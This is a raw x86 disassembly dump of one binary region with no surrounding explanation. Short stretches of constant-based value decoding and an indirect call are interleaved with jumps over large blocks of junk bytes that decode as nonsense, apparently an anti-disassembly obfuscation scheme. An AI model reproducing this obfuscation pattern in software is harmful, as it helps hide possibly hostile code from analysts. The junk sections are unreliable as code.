  410a96:	mov    bh,0x67
  410a98:	retf   0x80e
  410a9b:	data16 in al,dx
  410a9d:	xor    eax,0x4aff980c
  410aa2:	inc    eax
  410aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aa4:	in     eax,0xf9
  410aa6:	ret    
  410aa7:	mov    ebp,0x4d7187a0
  410aac:	xchg   ecx,eax
  410aad:	sbb    eax,0x812d99e8
  410ab2:	xor    eax,0xef910af3
  410ab7:	push   ss
  410ab8:	(bad)  [esi+0x77ea96f8]
  410abe:	(bad)  
  410ac0:	(bad)  
  410ac1:	sbb    bl,bh
  410ac3:	lds    eax,FWORD PTR [edx+0x40]
  410ac6:	mov    al,0x3
  410ac8:	inc    ebp
  410ac9:	or     BYTE PTR [ecx+0x458bf045],cl
  410acf:	in     al,0x85
  410ad1:	ror    BYTE PTR [edi],0x84
  410ad4:	mov    dh,0x5
  410ad6:	add    BYTE PTR [eax],al
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	(bad)  
  410af2:	jecxz  0x410a9c
  410af4:	rcl    DWORD PTR [ecx],cl
  410af6:	inc    ebp
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410ad3
  410afe:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410b00:	inc    ebx
  410b01:	xchg   DWORD PTR [edi-0x19f1b46],esi
  410b07:	call   0x4c7b:0x10a9ebd3
  410b0e:	(bad)  
  410b0f:	push   edi
  410b11:	fwait
  410b12:	add    dl,BYTE PTR [edx-0x4dc36fc7]
  410b18:	cli    
  410b19:	aam    0x35
  410b1b:	or     BYTE PTR [edx-0x1a],ch
  410b1e:	test   eax,0xad002d74
  410b23:	sub    dl,ah
  410b25:	(bad)  
  410b26:	push   ebx
  410b27:	inc    esp
  410b28:	mov    eax,ds:0x70ab50e6
  410b2d:	push   ds
  410b2e:	(bad)  
  410b30:	idiv   DWORD PTR [edx-0x2f756ef0]
  410b36:	rcr    DWORD PTR [edi+0x32f9235f],0x4c
  410b3d:	xor    bl,BYTE PTR [edi+0x55]
  410b40:	cmp    esi,DWORD PTR [esi+0x7d4d1ddc]
  410b46:	cwde   
  410b47:	mov    bl,cl
  410b49:	aas    
  410b4a:	push   0xfe4a265d
  410b4f:	and    ecx,eax
  410b51:	stc    
  410b52:	jg     0x410b9b
  410b54:	fdiv   DWORD PTR [edi-0x8225538]
  410b5a:	lock outs dx,DWORD PTR ds:[esi]
  410b5c:	and    eax,0x98ff5f10
  410b61:	mov    edi,0x325458a4
  410b66:	mov    dl,BYTE PTR [edi-0x6e5d97ea]
  410b6c:	jle    0x410bbf
  410b6e:	mov    eax,0x62ea5390
  410b73:	or     BYTE PTR gs:[ebx],cl
  410b76:	fst    DWORD PTR [ebp+0x6]
  410b79:	bound  esp,QWORD PTR [ebx+ecx*1+0x28f5ddb8]
  410b80:	cdq    
  410b81:	out    dx,eax
  410b82:	out    dx,eax
  410b83:	arpl   ax,cx
  410b85:	mov    ebp,DWORD PTR [edi]
  410b87:	(bad)  
  410b88:	xor    eax,0xf24cfc37
  410b8d:	and    DWORD PTR [ecx+0x43],eax
  410b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b91:	lea    edi,[ebp+0x0]
  410b94:	out    dx,eax
  410b95:	mov    ds:0xaad1330,eax
  410b9a:	inc    edx
  410b9b:	fucomp st(4)
  410b9d:	adc    ah,BYTE PTR [ecx-0x2b]
  410ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba1:	retf   0x8be6
  410ba4:	push   ebx
  410ba5:	(bad)  [edx-0x3eb536f9]
  410bab:	ins    BYTE PTR es:[edi],dx
  410bac:	enter  0x1911,0xb1
  410bb0:	hlt    
  410bb1:	xchg   DWORD PTR [ebx],ebx
  410bb3:	cmp    edx,DWORD PTR [ebx]
  410bb5:	fwait
  410bb6:	rcr    DWORD PTR [ecx+edi*4-0x67],1
  410bba:	fmul   DWORD PTR [ebx]
  410bbc:	shl    BYTE PTR ds:0x6187213b,1
  410bc2:	(bad)  
  410bc3:	jns    0x410bf7
  410bc5:	mov    ebp,0x24092024
  410bca:	aad    0xf0
  410bcc:	aad    0x6b
  410bce:	sub    eax,0xe57c7085
  410bd3:	lods   al,BYTE PTR ds:[esi]
  410bd4:	sub    BYTE PTR [eax],dl
  410bd6:	jp     0x410bac
  410bd8:	inc    eax
  410bd9:	ret    
  410bda:	lods   eax,DWORD PTR ds:[esi]
  410bdb:	xor    BYTE PTR [eax-0x6bfd0dee],0xb2
  410be2:	sbb    esp,DWORD PTR ds:0x42b7b544
  410be8:	stc    
  410be9:	jmp    0xf4914b04
  410bee:	or     eax,0x1c9c19b5
  410bf3:	sbb    DWORD PTR [ebp+0x7de0e510],ebp
  410bf9:	and    al,0x1f
  410bfb:	xchg   edi,eax
  410bfc:	cli    
  410bfd:	mov    eax,ds:0xed3c8b0a
  410c02:	test   eax,0xa66e903d
  410c07:	out    0x9,ax
  410c0a:	mov    eax,0x9b87358c
  410c0f:	xor    esp,esp
  410c11:	jge    0x410c2c
  410c13:	ja     0x410c63
  410c15:	imul   ebp,DWORD PTR [edx-0x72],0xffffffca
  410c19:	arpl   WORD PTR [edi-0x3478a4b7],dx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	and    bh,dh
  410c87:	push   esp
  410c88:	(bad)  
  410c89:	aaa    
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c66
  410c92:	mov    BYTE PTR [esi+0x3d18ccd3],dh
  410c98:	mov    ch,BYTE PTR [esi+0x9]
  410c9b:	xchg   ecx,eax
  410c9c:	gs push edi
  410c9e:	(bad)  
  410c9f:	jg     0x410cae
  410ca1:	fild   QWORD PTR [esi-0x14]
  410ca4:	es xchg edx,eax
  410ca6:	sar    BYTE PTR [ebx-0x21],0xaf
  410caa:	stos   DWORD PTR es:[edi],eax
  410cab:	pop    edx
  410cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cad:	lds    esp,FWORD PTR [ecx+0x6c0cb7f5]
  410cb3:	out    0x4a,al
  410cb5:	xchg   edx,eax
  410cb6:	sub    BYTE PTR [esi+0x40913f41],al
  410cbc:	test   al,0xe9
  410cbe:	adc    al,0x17
  410cc0:	and    eax,0x39e8c4e7
  410cc5:	neg    DWORD PTR [eax]
  410cc7:	and    bh,0xf7
  410cca:	rcl    DWORD PTR [ebp+0x77366be],cl
  410cd0:	imul   dh
  410cd2:	pop    ebx
  410cd3:	jmp    0xf04a:0x87a3bca6
  410cda:	push   ecx
  410cdb:	jl     0x410d41
  410cdd:	mov    ds:0xd0ef6fc1,eax
  410ce2:	lods   eax,DWORD PTR ds:[esi]
  410ce3:	xchg   edi,eax
  410ce4:	iret   
  410ce5:	clc    
  410ce6:	push   eax
  410ce7:	xchg   ebp,eax
  410ce8:	inc    eax
  410ce9:	sub    esi,DWORD PTR [ecx+0x0]
  410cec:	xchg   ecx,eax
  410ced:	ins    DWORD PTR es:[edi],dx
  410cee:	cli    
  410cef:	sbb    al,0xb2
  410cf1:	push   ebp
  410cf2:	in     eax,dx
  410cf3:	push   esp
  410cf4:	js     0x410c80
  410cf6:	std    
  410cf7:	pop    esp
  410cf8:	mov    eax,0xf0e062a7
  410cfd:	fisub  WORD PTR ds:0x119a586d
  410d03:	(bad)  
  410d04:	ss jl  0x410d3c
  410d07:	push   ecx
  410d08:	in     eax,dx
  410d09:	outs   dx,BYTE PTR ds:[esi]
  410d0a:	sub    edx,DWORD PTR [esi]
  410d0c:	xchg   ebp,eax
  410d0d:	lea    ebp,[ebp*2+0x60b98c5f]
  410d14:	mov    ch,BYTE PTR [edi+ecx*2+0x7b3d366d]
  410d1b:	xor    eax,0xa957d519
  410d20:	in     al,dx
  410d21:	imul   eax,esp,0xffffff96
  410d24:	mov    bh,0x56
  410d26:	jmp    0x410d6d
  410d28:	mov    cl,0xcf
  410d2a:	xor    esi,DWORD PTR [edx-0x45]
  410d2d:	push   edx
  410d2e:	les    ecx,FWORD PTR [edi]
  410d30:	push   ss
  410d31:	mov    ?,WORD PTR [edi]
  410d33:	scas   eax,DWORD PTR es:[edi]
  410d34:	mov    al,ds:0x3dd24434
  410d39:	bound  edi,QWORD PTR [ebx-0x1]
  410d3c:	fidivr WORD PTR [esi+0x69]
  410d3f:	or     cl,dh
  410d41:	div    BYTE PTR [ebp-0x26daa262]
  410d47:	iret   
  410d48:	cmc    
  410d49:	aaa    
  410d4a:	retf   0x6cbc
  410d4d:	iret   
  410d4e:	xchg   DWORD PTR [esi+0x41],edx
  410d51:	les    edx,FWORD PTR [ecx-0x6bee99d8]
  410d57:	repz cmp bh,dh
  410d5a:	inc    esp
  410d5b:	into   
  410d5c:	jns    0x410d18
  410d5e:	pop    es
  410d5f:	fistp  WORD PTR [eax]
  410d61:	in     eax,dx
  410d62:	retf   0xe9fa
  410d65:	or     bl,ah
  410d67:	(bad)  
  410d68:	(bad)  
  410d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d6a:	dec    DWORD PTR [ecx]
  410d6c:	xchg   ebp,eax
  410d6d:	inc    ebp
  410d6e:	stc    
  410d6f:	and    DWORD PTR [ebx],0x26
  410d72:	test   al,0x2a
  410d74:	pop    esp
  410d75:	iret   
  410d76:	push   esi
  410d77:	scas   al,BYTE PTR es:[edi]
  410d78:	mov    eax,DWORD PTR [ebp+0x3b]
  410d7b:	jmp    DWORD PTR [eax+0x28d1f243]
  410d81:	jb     0x410d12
  410d83:	sbb    BYTE PTR [ebx-0x33],dl
  410d86:	inc    esp
  410d87:	mov    cl,0x77
  410d89:	sbb    eax,0x29c5a709
  410d8e:	outs   dx,BYTE PTR ds:[esi]
  410d8f:	sub    DWORD PTR [ebp-0x57],eax
  410d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d93:	inc    ecx
  410d94:	iret   
  410d95:	enter  0x803c,0xf5
  410d99:	lahf   
  410d9a:	cs hlt 
  410d9c:	sti    
  410d9d:	jbe    0x410db5
  410d9f:	push   edx
  410da0:	sbb    DWORD PTR [esi+0x47511074],ebx
  410da6:	push   cs
  410da7:	leave  
  410da8:	mov    ch,0xe9
  410daa:	push   ebx
  410dab:	test   BYTE PTR [esi+0x53b9de94],dl
  410db1:	or     BYTE PTR [ecx+0x7],dl
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x33ba3c00],esi
  410e04:	lods   al,BYTE PTR ds:[esi]
  410e05:	aad    0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410dec
  410e0e:	loop   0x410e49
  410e10:	clc    
  410e11:	sar    DWORD PTR fs:[eax-0x4b],cl
  410e15:	ins    BYTE PTR es:[edi],dx
  410e16:	inc    BYTE PTR [ebp-0x62]
  410e19:	dec    edx
  410e1a:	icebp  
  410e1b:	jle    0x410e06
  410e1d:	pop    esp
  410e1e:	shl    BYTE PTR [esi-0x15],cl
  410e21:	inc    ebx
  410e22:	push   0x2b
  410e24:	adc    BYTE PTR [ecx],bl
  410e26:	into   
  410e27:	mov    al,dl
  410e29:	rol    BYTE PTR [esi],1
  410e2b:	sbb    eax,0xcd61f277
  410e30:	sbb    eax,0xeb566372
  410e35:	scas   al,BYTE PTR es:[edi]
  410e36:	and    DWORD PTR [esi+0x640b248a],eax
  410e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e3d:	pop    edi
  410e3e:	inc    ebp
  410e3f:	add    cl,bh
  410e41:	mov    DWORD PTR [esi+0x68b708b1],edi
  410e47:	push   edi
  410e48:	mov    edi,0xab853620
  410e4d:	jle    0x410e3b
  410e4f:	and    DWORD PTR ds:0xe762bf82,esp
  410e55:	xchg   ebx,eax
  410e56:	in     eax,dx
  410e57:	dec    BYTE PTR ds:0xe9f0007c
  410e5d:	xchg   edi,eax
  410e5e:	lahf   
  410e5f:	ror    BYTE PTR [edi+ebx*1-0x54],0x3d
  410e64:	pop    eax
  410e65:	test   DWORD PTR [eax+0x5f],0xc991b940
  410e6c:	nop
  410e6d:	or     BYTE PTR [eax+0x37],ah
  410e70:	es enter 0x6fd5,0x3e
  410e75:	in     al,0x72
  410e77:	push   ds
  410e78:	lods   al,BYTE PTR ds:[esi]
  410e79:	cmp    DWORD PTR [eax-0x4d31ea97],ecx
  410e7f:	shl    eax,1
  410e81:	bound  edx,QWORD PTR [edx+esi*2+0x57b1c14]
  410e88:	pushf  
  410e89:	mov    ch,0xcd
  410e8b:	(bad)  
  410e8c:	jp     0x410ebd
  410e8e:	mov    bl,0x36
  410e90:	dec    esi
  410e92:	and    BYTE PTR [esi+0x79],al
  410e95:	dec    ebp
  410e96:	fwait
  410e97:	leave  
  410e98:	test   eax,0x878811aa
  410e9d:	sar    DWORD PTR [edi+0x1414cb27],cl
  410ea3:	ror    BYTE PTR [ecx],cl
  410ea5:	int3   
  410ea6:	or     bl,BYTE PTR [ebp+0x2b]
  410ea9:	lods   al,BYTE PTR ds:[esi]
  410eaa:	outs   dx,DWORD PTR ds:[esi]
  410eab:	sub    BYTE PTR [ebp-0xd178f52],0xf0
  410eb2:	es pop es
  410eb4:	arpl   WORD PTR [ecx],ax
  410eb6:	test   al,0x30
  410eb8:	stos   BYTE PTR es:[edi],al
  410eb9:	hlt    
  410eba:	mov    WORD PTR [edx-0x10],fs
  410ebd:	addr16 ret 0x1751
  410ec1:	std    
  410ec2:	cmp    ch,al
  410ec4:	dec    eax
  410ec5:	xchg   edi,eax
  410ec6:	stc    
  410ec7:	(bad)  
  410ec8:	popa   
  410ec9:	stos   BYTE PTR es:[edi],al
  410eca:	add    esp,edi
  410ecc:	nop
  410ecd:	mov    ds:0xe942e067,eax
  410ed2:	dec    ebx
  410ed3:	sti    
  410ed4:	mov    dl,0xb7
  410ed6:	xchg   esi,eax
  410ed7:	lods   eax,DWORD PTR ds:[esi]
  410ed8:	hlt    
  410ed9:	and    DWORD PTR [eax-0x352dfb3a],ebx
  410edf:	add    bh,0x89
  410ee2:	mov    WORD PTR [edi+eiz*8+0x78],?
  410ee6:	xor    eax,0x8d33ed5f
  410eeb:	into   
  410eec:	sahf   
  410eed:	lods   al,BYTE PTR ds:[esi]
  410eee:	mov    ah,0xaf
  410ef0:	test   eax,0x22f293d0
  410ef5:	mov    esi,0xbb190599
  410efa:	lods   al,BYTE PTR fs:[esi]
  410efc:	cwde   
  410efd:	sub    BYTE PTR [ebx],al
  410eff:	into   
  410f00:	mov    edi,0xbc0f7dde
  410f05:	jo     0x410f63
  410f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f08:	cmp    eax,0x48f80f72
  410f0d:	and    ah,ch
  410f0f:	rcr    bh,1
  410f11:	addr16 enter 0x5c80,0x22
  410f16:	sahf   
  410f17:	jmp    0xe5bc:0x4dd37833
  410f1e:	sub    eax,DWORD PTR [eax+0x4cb19544]
  410f24:	ffreep st(5)
  410f26:	ret    
  410f27:	sub    ah,bl
  410f29:	adc    cl,cl
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	add    eax,DWORD PTR [eax-0x4d]
  410f4c:	pop    esp
  410f4d:	jmp    0x410f95
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410f8e
  410f56:	dec    esi
  410f57:	(bad)  
  410f59:	mov    ebx,0x92069b50
  410f5e:	sub    DWORD PTR [ebx],eax
  410f60:	ins    DWORD PTR es:[edi],dx
  410f61:	push   0xffffff8d
  410f63:	cmp    BYTE PTR [ebx],bh
  410f65:	push   DWORD PTR [esi+edx*1-0x2d]
  410f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f6a:	je     0x410fca
  410f6c:	jns    0x410f99
  410f6e:	and    al,0xfd
  410f70:	stc    
  410f71:	xor    esi,DWORD PTR [edi+0x7e9bc5cf]
  410f77:	xor    BYTE PTR [edi+edx*8+0x2123a2d7],bl
  410f7e:	adc    ecx,ebp
  410f80:	mov    ah,0x79
  410f82:	aas    
  410f83:	call   0x597cd06e
  410f88:	jns    0x410f11
  410f8a:	jmp    0x410fb3
  410f8c:	xor    eax,DWORD PTR [ecx]
  410f8e:	pop    es
  410f8f:	gs xor al,0x69
  410f92:	fdivrp st(4),st
  410f94:	mov    ah,0xca
  410f96:	sub    esp,eax
  410f98:	aas    
  410f99:	xchg   ebx,eax
  410f9a:	loopne 0x410f4c
  410f9c:	and    eax,0x7649e3ee
  410fa1:	pop    ebx
  410fa2:	jmp    0x418e:0x35f0f086
  410fa9:	(bad)  
  410faa:	mov    ebp,0xc921c12
  410faf:	dec    ebp
  410fb0:	jl     0x410f58
  410fb2:	push   ds
  410fb3:	jmp    0x410fd3
  410fb5:	jae    0x410f87
  410fb7:	dec    esi
  410fb8:	push   edi
  410fb9:	jnp    0x41100a
  410fbb:	sbb    bl,BYTE PTR [ebp-0x7e]
  410fbe:	js     0x410fe5
  410fc0:	sbb    DWORD PTR [ebp+0x4072f261],0x6c6546dd
  410fca:	mov    esp,0x1af4f199
  410fcf:	xchg   edx,eax
  410fd0:	add    ebx,edi
  410fd2:	mov    gs,WORD PTR [esi-0x30353a2d]
  410fd8:	daa    
  410fd9:	not    DWORD PTR [eax]
  410fdb:	fst    QWORD PTR ss:[eax]
  410fde:	sti    
  410fdf:	and    al,ch
  410fe1:	xor    BYTE PTR [esi-0x75],bh
  410fe4:	arpl   cx,di
  410fe6:	mov    ?,WORD PTR [edi-0x54f07dcd]
  410fec:	pop    ebp
  410fed:	add    esi,ecx
  410fef:	test   DWORD PTR [ebx+esi*1+0x2a06a204],esp
  410ff6:	call   0x3c7bbfc5
  410ffb:	(bad)  
  410ffc:	cmp    BYTE PTR [eax],dl
  410ffe:	sbb    esi,DWORD PTR [ecx+0xe238f43]
  411004:	jo     0x410fef
  411006:	(bad)  
  411007:	fidiv  DWORD PTR [ebx]
  411009:	lds    edx,FWORD PTR [esi-0x2881a1e7]
  41100f:	mov    cl,0x92
  411011:	sbb    al,0x5e
  411013:	adc    eax,esp
  411015:	mov    ds:0x395c998,al
  41101a:	in     eax,0x56
  41101c:	xchg   DWORD PTR [ebx-0x29570e63],ecx
  411022:	ins    DWORD PTR es:[edi],dx
  411023:	cli    
  411024:	popa   
  411025:	pop    es
  411026:	add    ebx,esi
  411028:	jle    0x410fb8
  41102a:	jo     0x411018
  41102c:	sub    edi,DWORD PTR [ebx]
  41102e:	sbb    al,0x3
  411030:	dec    DWORD PTR [edi-0x30abda5a]
  411036:	mov    bl,0xd2
  411038:	push   ecx
  411039:	inc    edx
  41103a:	test   DWORD PTR [edx],eax
  41103c:	inc    edi
  41103d:	out    dx,al
  41103e:	push   ds
  41103f:	dec    ebp
  411040:	in     eax,0xf1
  411042:	std    
  411043:	xchg   DWORD PTR fs:0x6becf22b,edi
  41104a:	shl    DWORD PTR [ebp-0x26],1
  41104d:	mov    esi,0x2144b240
  411052:	xchg   esp,eax
  411053:	xchg   ecx,eax
  411054:	mov    ch,0x32
  411056:	push   eax
  411057:	(bad)  
  411058:	xchg   BYTE PTR [esi],dh
  41105a:	mov    dl,BYTE PTR [ebx+0x33]
  41105d:	mov    ebx,DWORD PTR [eax+0x9]
  411060:	ror    ch,cl
  411062:	repz mov bl,BYTE PTR [eax]
  411065:	(bad)  
  411066:	xchg   ebp,eax
  411067:	or     esp,DWORD PTR [ebx]
  411069:	xor    edx,DWORD PTR [eax+0x71e04e7b]
  41106f:	ficomp DWORD PTR [esi-0x737207ee]
  411075:	or     bl,BYTE PTR [edx+0x3b003272]
  41107b:	enter  0x850f,0xe5
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	stos   DWORD PTR es:[edi],eax
  4110b2:	rcr    DWORD PTR [ebx+eax*2+0x7c7c4189],1
  4110b9:	adc    bh,BYTE PTR [edi+0x7c]
  4110bc:	jl     0x4110a5
  4110be:	in     eax,dx
  4110bf:	mov    BYTE PTR [ecx-0x15a48258],cl
  4110c5:	(bad)  
  4110c6:	aad    0x74
  4110c8:	(bad)  [eax+ecx*8-0x29ea975b]
  4110cf:	mov    al,0xd7
  4110d1:	stos   DWORD PTR es:[edi],eax
  4110d2:	inc    esi
  4110d3:	daa    
  4110d4:	mov    ch,0xf8
  4110d6:	das    
  4110d7:	push   ebx
  4110d8:	add    cl,ah
  4110da:	cmp    edi,DWORD PTR [eax-0xaf6f59c]
  4110e0:	xchg   esp,eax
  4110e1:	out    0xa9,eax
  4110e3:	mov    dl,0x32
  4110e5:	jg     0x411148
  4110e7:	test   eax,0x87b35d30
  4110ec:	ret    0x3d70
  4110ef:	rcr    DWORD PTR [edx+0x2b],cl
  4110f2:	adc    esp,edi
  4110f4:	call   0x63bb9815
  4110f9:	sub    ebx,ebp
  4110fb:	pop    esp
  4110fc:	(bad)  
  4110fd:	adc    eax,0x167c52a1
  411102:	sub    al,0x7a
  411104:	or     BYTE PTR [esi+0x5e],ah
  411107:	adc    eax,0x71bd5c97
  41110c:	outs   dx,BYTE PTR ds:[esi]
  41110d:	mov    eax,0x487960be
  411112:	and    bh,bl
  411114:	imul   edi,DWORD PTR [eax],0xa0375e40
  41111a:	xchg   esi,eax
  41111b:	or     esi,DWORD PTR [ebx+eiz*8]
  41111e:	sbb    dh,BYTE PTR [edx-0x5e8af82b]
  411124:	adc    BYTE PTR [ebx],al
  411126:	mov    dl,0x68
  411128:	sbb    al,0x5f
  41112a:	(bad)  
  41112b:	adc    al,ch
  41112d:	call   0x484e:0xad8666f0
  411134:	push   edx
  411135:	or     eax,0x4bdf9fdf
  41113a:	outs   dx,DWORD PTR ds:[esi]
  41113b:	pusha  
  41113c:	push   es
  41113d:	and    DWORD PTR [eax-0xc],ecx
  411140:	xor    bh,BYTE PTR [ebx]
  411142:	(bad)  
  411143:	loop   0x4111c2
  411145:	mov    eax,0x85f1d3b9
  41114a:	add    DWORD PTR cs:[edx],0x980027c8
  411151:	adc    DWORD PTR [ebx],ebp
  411153:	loop   0x411133
  411155:	jecxz  0x411150
  411157:	adc    BYTE PTR [edi-0x62],ah
  41115a:	loop   0x4110ed
  41115c:	iret   
  41115d:	dec    esi
  41115e:	bound  ebx,QWORD PTR [ecx]
  411160:	jp     0x411129
  411162:	test   eax,0xba985e7d
  411167:	js     0x411133
  411169:	test   BYTE PTR [ecx],cl
  41116b:	aaa    
  41116c:	retf   
  41116d:	sti    
  41116e:	and    cl,ah
  411170:	leave  
  411171:	push   ecx
  411172:	pop    ss
  411173:	sub    dl,BYTE PTR [edx]
  411175:	sar    BYTE PTR [edx+0x467abb2f],0xf
  41117c:	aam    0xa3
  41117e:	and    DWORD PTR [edx-0x7be6f83],0xffffffbf
  411185:	or     WORD PTR [eax-0x9873c95],bp
  41118c:	aaa    
  41118d:	sbb    ebp,DWORD PTR [ecx+0x66]
  411190:	xchg   BYTE PTR [ebx],cl
  411192:	adc    al,0xde
  411194:	addr16 in eax,0xfa
  411197:	sbb    eax,0x23206738
  41119c:	imul   edx,DWORD PTR [edx+edi*1],0xffffff90
  4111a0:	cmp    ebp,DWORD PTR [ecx+eax*8]
  4111a3:	add    esp,DWORD PTR [ebx]
  4111a5:	iret   
  4111a6:	out    0xa8,eax
  4111a8:	retf   0x1fc0
  4111ab:	lods   al,BYTE PTR ds:[esi]
  4111ac:	add    cl,BYTE PTR [edx]
  4111ae:	sti    
  4111af:	sbb    al,0xca
  4111b1:	mov    ?,WORD PTR [edi+eiz*2]
  4111b4:	and    BYTE PTR [edx],cl
  4111b6:	jle    0x4111c7
  4111b8:	jle    0x41116c
  4111ba:	and    eax,0x7fa3e861
  4111bf:	adc    al,0x63
  4111c1:	sub    eax,0x8134e444
  4111c6:	add    BYTE PTR [ebp+0x587d9aee],cl
  4111cc:	outs   dx,BYTE PTR ds:[esi]
  4111cd:	mov    eax,ds:0xacedb833
  4111d2:	scas   al,BYTE PTR es:[edi]
  4111d3:	push   ds
  4111d4:	mov    ecx,0xb50cd94b
  4111d9:	and    esi,eax
  4111db:	add    ebx,DWORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x1f5a,0x51
  4111ff:	adc    eax,0x7c40af38
  411204:	jl     0x411218
  411206:	jg     0x411284
  411208:	jl     0x4111e8
  41120a:	pop    esi
  41120b:	leave  
  41120c:	adc    BYTE PTR [eax+ebp*2],ah
  41120f:	xchg   esp,eax
  411210:	aad    0xf
  411212:	ret    
  411213:	mov    ebp,0x1b2481c6
  411218:	dec    eax
  411219:	pop    edx
  41121a:	in     eax,0x6e
  41121c:	lahf   
  41121d:	dec    edx
  41121e:	pop    es
  41121f:	daa    
  411220:	lea    esi,[ecx]
  411222:	xor    dl,ah
  411224:	xor    eax,0x4aa54e
  411229:	add    BYTE PTR [eax+0x2321e143],dh
  41122f:	adc    cl,BYTE PTR [edi-0x4c]
  411232:	and    DWORD PTR [edx-0x7],ecx
  411235:	push   eax
  411236:	lea    edx,[esi-0x79]
  411239:	fdiv   st(1),st
  41123b:	jo     0x41128c
  41123d:	adc    ah,BYTE PTR [ecx]
  41123f:	jne    0x4112b5
  411241:	ja     0x411238
  411243:	cmp    BYTE PTR [esi],ch
  411245:	test   al,0x49
  411247:	fbstp  TBYTE PTR [esi+0x2ee42c35]
  41124d:	mov    ds,WORD PTR [esi]
  41124f:	push   0xd8bf3ea4
  411254:	pushf  
  411255:	aam    0xed
  411257:	mov    ebp,ebx
  411259:	xor    DWORD PTR ds:0x1bf273f8,0x5b6bf7b
  411263:	jnp    0x411253
